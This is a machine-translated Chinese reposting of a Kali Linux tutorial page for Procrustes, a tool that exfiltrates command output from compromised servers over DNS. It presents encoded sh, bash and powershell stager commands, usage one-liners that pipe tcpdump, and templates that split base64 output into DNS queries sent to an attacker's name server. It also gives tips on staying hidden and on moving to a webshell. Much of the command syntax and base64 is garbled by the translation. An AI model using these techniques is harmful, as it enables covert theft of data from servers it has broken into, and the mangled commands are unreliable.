# Procrustes:通过 DNS 自动过滤数据的脚本

> 原文：<https://kalilinuxtutorials.com/procrustes/>

[![Procrustes : Script To Automates The Exfiltration Of Data Over DNS](img/40a516caf7da0cbfc0bc6523f3abfdcc.png "Procrustes : Script To Automates The Exfiltration Of Data Over DNS")](https://1.bp.blogspot.com/-9Oewr4LrKrc/YE2umsNjgWI/AAAAAAAAIgg/MJlCkSxNK9w6bNRCLdHu6aaT9yk1omZtACLcBGAsYHQ/s1307/procrustes-1.gif)

Procrustes 是一个 bash 脚本，如果我们在一个服务器上盲目执行命令，除了 dns 之外的所有出站连接都被阻塞，它会自动通过 DNS 过滤数据。

该脚本目前支持 sh、bash 和 powershell，并且兼容 exec 风格的命令执行(例如 java.lang.Runtime.exec)。

*   **未暂存:**

![Procrustes : Script To Automates The Exfiltration Of Data Over DNS](img/40a516caf7da0cbfc0bc6523f3abfdcc.png "Procrustes : Script To Automates The Exfiltration Of Data Over DNS")

*   **暂存:**

![](img/6d5962877b3140f102bd2fb035509b36.png)

对于其操作，脚本将我们希望在目标服务器上运行的命令作为输入，并根据目标 shell 对其进行转换，以便允许其输出通过 DNS 进行渗透。在命令被转换之后，它被提供给“调度程序”。调度程序是由用户提供的程序，负责将命令作为输入，并通过任何必要的手段(例如利用漏洞)在目标服务器上执行该命令。在目标服务器上执行该命令后，预计它会触发对我们的 DNS 名称服务器的 DNS 请求，其中包含我们的数据块。脚本监听这些请求，直到用户提供的命令的输出被完全提取。

以下是支持的命令转换，为命令的执行而生成:`ls`

*   上海:

sh -c $@|base64${IFS}-d|sh。echo igrpzybamcardhjpzxm 9 nsbgkgxzkxxiyxnlnjqglxcwfhdjic 1 jyc 5 szw 4 njazntqxmtc 4 ndoyxrldi5 lcgo =

*   bash:

bash -c {echo，ig 5 zgb9 va 3 vwigabhgggggggggggghc 2u 2 ncatdzb 8 D2 mglwngmrxlbi 4 xnjamdmwntynldoyxrldi 5 lcgo = } | { base 64，-d}|bash

*   powershell:

**powershell-enc ugblahmabwabzqaqabgbzaae 4 ayqbtaguayaagaagaiagb7 adaafqauahsamqb9ac 4 aewayah 0 aiga 0 azgagacgawwbdag 8 abgn 2 agagagaggb0 af 0 aoga 6 afqabwabwabagyanahqacgbpg 4 azwaoafswb 5 Ahmad abag 0 algbuaguaaeab 0 AC 4 arqbumambkagbgbnaf 0 aoga 6**

**用途**

*   bash 的本地测试:

**。/procrustos _ chunked . sh-h whatev . er-d " dig @ 0+tries = 5 "-x dispatcher _ examples/local _ bash . sh—' ls-lha | grep secret '<<(STD buf-oL tcpdump–immediate-l-I any UDP port 53)**

*   使用 WSL2 对 powershell 进行本地测试:

**stdbuf-oL tcpdump–immediate-l-I 任何 udp 端口 53|。/procrustos _ chunked . sh-w PS-h whatev . er-d " Resolve-DNS Name-Server wsl 2 _ IP-Name "-x dispatcher _ examples/local _ powershell _ wsl 2 . sh—' gci | % { $ _。名称}'**

*   powershell 示例，其中我们 ssh 到我们的 NS 来获取传入的 DNS 请求。

**。/procrustos _ chunked . sh-w PS-h your DNS . host-d " Resolve-DNS name "-x dispatcher _ examples/curl _ waf . sh—' gci | % { $ _。名称} '<<(stdbuf-oL ssh user @ HOST ' sudo tcpdump–immediate-l UDP port 53 ')**

*   关于选项的更多信息

**。/procrustos _ chunked . sh–help**

**procure _ chunked vs procure _ full**

简而言之，假设我们要解密一些数据，这些数据必须分成四个数据块才能通过 DNS 传输:

*   **procrustos _ Chunked:**调用调度程序四次，每次都从服务器请求不同的块。它的有效载荷相对较小，速度很快，不需要任何特殊的配置。
*   **procrustos _ Full:**调用调度程序一次，将在服务器上执行的命令将负责分块数据并将它们发送过来。它可以有更大的有效负载大小，它很快(速度可以通过-t 参数来调整)，并且当 dns_server 在名称服务器上运行时，它的速度可以进一步优化。
*   **proc routes _ Full/Staged:**与 proc routes _ Full 相同，但是使用 stager 来获取 proc routes _ Full 用来分块数据的命令。它具有最小的“有效负载”大小，但就渗出率而言也是最慢的，因为实际的有效负载是通过 DNS 下载的。对于其操作，需要创建一个 nsconfig 脚本。注意:每个名称服务器(而不是每个目标服务器)只应创建一次 nsconfig 脚本。

它们之间的一些差异也可以通过 bash 使用的模板命令来说明:

*   **普罗克罗斯特斯 _chunked/bash:**

**% DNS _ TRIGGER % `(% CMD %)| base64-w0 | cut-b $((% INDEX %+1))-$((% INDEX %+% COUNT %))' `。%UNIQUE_DNS_HOST%**

*   **普罗克罗斯特斯 _full/bash:**

**(% CMD %)| base64-w0 | echo $(cat)–| grep-Eo '。{1，% LABEL _ SIZE % } ' | xargs-n % n labels % echo | tr ' '。|awk '{printf "%s.%s%s\n "，$1，NR，" % UNIQUE _ DNS _ HOST % " } ' | xargs-P % THREADS %-n1 % DNS _ TRIGGER %**

*   **procrustos _ full/bash/staged:**

(序列%迭代% | % S _ DNS _ TRIGGGER % $(目录)。%UNIQUE_DNS_HOST%|tr\ | printf % 02x $(cat)| xxd-r-p)| bash

|  | 普罗克罗斯特斯 _chunked | 普罗克罗斯特斯 _full | 普罗克罗斯特斯 _ 完整 _ 上演 |
| --- | --- | --- | --- |
| 负载大小开销(bash/powershell) | 150 * NLABELS/500 * NLABELS(+CMD _ LEN) | 300/800+CMD _ LEN | 150/400[1] |
| 调度员呼叫# | # output/(LABEL _ SIZE * NLABELS)[2] | one | one |
| 速度(bash/powershell) | ✔/✔ | ✔/✔ | 【三】 |
| 配置难度 | 容易的 | 轻松+ | 媒介 |

*   对于分阶段版本，该命令是通过 DNS 下载的，因此列出的大小也是总负载大小。
*   在 procroustes _ chunked 上，dispatcher 被多次调用，因此提供的命令应该在服务器上执行(直到它的所有输出都被渗透)。在向服务器传送命令(即通过调用调度程序)是时间/资源密集型的情况下，这种行为并不理想。

如果我们在服务器上执行的命令不是等幂的(功能或输出方面，例如“ls；rm 文件”)或者是时间/资源密集型的(例如，find / -name secret)。这种情况的解决方法是首先将命令输出存储到一个文件中(例如/tmp/file ),然后使用脚本读取该文件。

*   在分阶段版本中，我们有通过 DNS 获得实际有效负载所需的时间开销。应该注意的是，该脚本利用 A 记录来获取实际的有效负载。尽管这允许我们的流量更好地融入目标环境的常规流量，但它提供了有限的通道容量(例如，每个请求 4 个字节)。我们可以利用其他记录类型，如 TXT，并最小化阶段下载时间(接近于零)和阶段大小。

**提示**

*   您可能希望尽可能少地使用这个脚本，尽可能快地过渡到更高带宽的通道(例如 HTTP-webshell)
*   如果需要长文本输出，您可以先尝试压缩它，以加快导出过程，例如。/procrustes _ full . sh…-o >(setsid gunzip)—' ls-lhR/| gzip '
*   大文件/二进制文件的另一种可能性是将它们复制到一个可访问的路径，例如通过 HTTP
*   要增加 procrustes_full 中的 exfil 带宽，请在您的名称服务器上运行 dns_server。这样，我们可以避免在移动到新的块之前等待底层 DNS_TRIGGER 超时。
*   理想情况下，您应该有一个带有 NS 记录的域(-h 选项)，该记录指向您控制的服务器(我们运行 tcpdump 的服务器)。然而，如果允许目标启动到任意 DNS 服务器的连接，这可以通过将 DNS 触发器显式设置为使用我们的 DNS 服务器来避免(例如 dig @your_server whatev.er)

**学分**

*   [collab filter](https://github.com/0xC01DF00D/Collabfiltrator)–在服务器上分块数据的想法。它还使用这个脚本执行类似的功能，所以请检查一下。
*   [DNS livery](https://github.com/no0be/DNSlivery)–DNS livery 的修改版本被用作 DNS 服务器

[**Download**](https://github.com/vp777/procrustes)